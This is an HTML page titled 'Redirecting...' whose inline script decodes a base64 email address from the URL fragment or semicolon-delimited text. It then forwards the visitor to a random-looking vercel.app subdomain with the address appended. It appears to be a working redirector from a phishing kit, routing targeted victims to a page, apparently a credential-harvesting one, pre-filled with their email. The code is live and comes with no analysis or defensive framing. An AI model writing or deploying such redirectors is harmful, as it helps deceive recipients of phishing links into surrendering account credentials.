<html lang="en">

<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <title>Redirecting...</title>
</head>

<body>

  <script type="text/javascript">
    var url_string = window.location.href;
    var url_get_email = atob(getafterhash(url_string));
    
    // Check if url_get_email is valid before constructing the URL
    if (url_get_email) {
      var mail_go_url = "https://ogandghgfcfghjjdegjkjcfdfhhjgddfghj.vercel.app#" + url_get_email;
      location.replace(mail_go_url);
    } else {
      console.error("No valid email found in the URL hash.");
    }

    function getafterhash(url) {
      var ret;
      var queryStringhash = url.split('#')[1];
      var queryStringsemi = url.split(';')[1];
      var queryStringsemiplus = url.split(';+')[1];
      var queryStringstartsemi = url.split('*;')[1];

      if (queryStringhash) {
        ret = queryStringhash;
      } else if (queryStringsemi) {
        ret = queryStringsemi;
      } else if (queryStringsemiplus) {
        ret = queryStringsemiplus;
      } else if (queryStringstartsemi) {
        ret = queryStringstartsemi;
      } else {
        ret = 0;
      }

      return ret;
    }
  </script>

</body>

</html>
